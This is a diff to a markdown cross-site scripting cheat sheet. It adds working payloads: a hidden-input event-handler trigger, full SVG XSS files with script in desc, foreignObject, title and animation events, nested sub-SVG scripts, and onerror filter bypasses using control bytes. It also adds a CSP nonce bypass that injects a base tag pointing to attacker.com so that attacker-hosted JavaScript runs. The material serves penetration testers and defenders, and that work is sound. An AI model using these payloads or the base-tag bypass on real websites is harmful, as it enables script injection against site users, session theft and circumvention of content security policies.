@@ -83,6 +83,8 @@
     - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
     - [Bypass CSP script-src self](#bypass-csp-script-src-self)
     - [Bypass CSP script-src data](#bypass-csp-script-src-data)
+    - [Bypass CSP nonce](#bypass-csp-nonce)
+    - [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)
   - [References](#references)
 
 ## Vulnerability Details
@@ -295,6 +297,10 @@ e.g: 14.rs/#alert(document.domain)
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
+in newer browsers : firefox-130/chrome-108
+```javascript
+<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
+```
 
 ### XSS when payload is reflected capitalized
 
@@ -384,6 +390,8 @@ vbscript:msgbox("XSS")
 
 ### XSS in SVG
 
+Simple script. Codename: green triangle
+
 ```xml
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -396,6 +404,29 @@ vbscript:msgbox("XSS")
 </svg>
 ```
 
+More comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
+  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
+  <desc><script>alert('svg desc')</script></desc>
+  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
+  <foreignObject width="500" height="500">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
+  </foreignObject>
+  <title><script>alert('svg title')</script></title>
+  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
+  <script type="text/javascript">
+    alert('svg script');
+  </script>
+</svg>
+```
+
+
+
 ### XSS in SVG (short)
 
 ```javascript
@@ -404,6 +435,43 @@ vbscript:msgbox("XSS")
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+
+### XSS in SVG (nesting)
+
+Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.
+
+SVG 1.x (xlink:href)
+
+```xml
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
+</svg>
+```
+
+Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern browsers. Author: noraj.
+
+SVG 1.x (xlink:href)
+
+```xml
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
+</svg>
+```
+
+However, including svg tags in SVG documents works and allows XSS execution from sub-SVGs. Codename: french flag. Author: noraj.
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <svg x="10">
+    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
+    <script type="text/javascript">alert('sub-svg 1');</script>
+  </svg>
+  <svg x="200">
+    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
+    <script type="text/javascript">alert('sub-svg 2');</script>
+  </svg>
+</svg>
 ```
 
 ### XSS in Markdown
@@ -737,9 +805,11 @@ setTimeout`alert\u0028document.domain\u0029`;
 <object onafterscriptexecute=confirm(0)>
 <object onbeforescriptexecute=confirm(0)>
 
-// Bypass onxxx= filter with a null byte/vertical tab
+// Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
 <img src='1' onerror\x00=alert(0) />
 <img src='1' onerror\x0b=alert(0) />
+<img src='1' onerror\x0d=alert(0) />
+<img src='1' onerror\x0a=alert(0) />
 
 // Bypass onxxx= filter with a '/'
 <img src='1' onerror/=alert(0) />
@@ -751,7 +821,7 @@ setTimeout`alert\u0028document.domain\u0029`;
 // Bypass space filter with "/"
 <img/src='1'/onerror=alert(0)>
 
-// Bypass space filter with 0x0c/^L
+// Bypass space filter with 0x0c/^L or 0x0d/^M or 0x0a/^J or 0x09/^I
 <svgonload=alert(1)>
 
 $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
@@ -1240,6 +1310,26 @@ Source: [@404death](https://twitter.com/404death/status/1191222237782659072)
 ```javascript
 "/><script>alert(1);</script>
 ```
+
+
+### Bypass CSP nonce
+
+**Requirements**:
+
+* CSP like `script-src 'nonce-RANDOM_NONCE'`
+* Imported JS file with a relative link: `<script src='/PATH.js'></script>`
+
+
+**Payload**:
+
+1. Inject a base tag.
+  ```html
+  <base href=http://www.attacker.com>
+  ```
+2. Host your custom js file at the same path that one of the website's script.
+  ```
+  http://www.attacker.com/PATH.js
+  ```
 
 
 ### Bypass CSP header sent by PHP
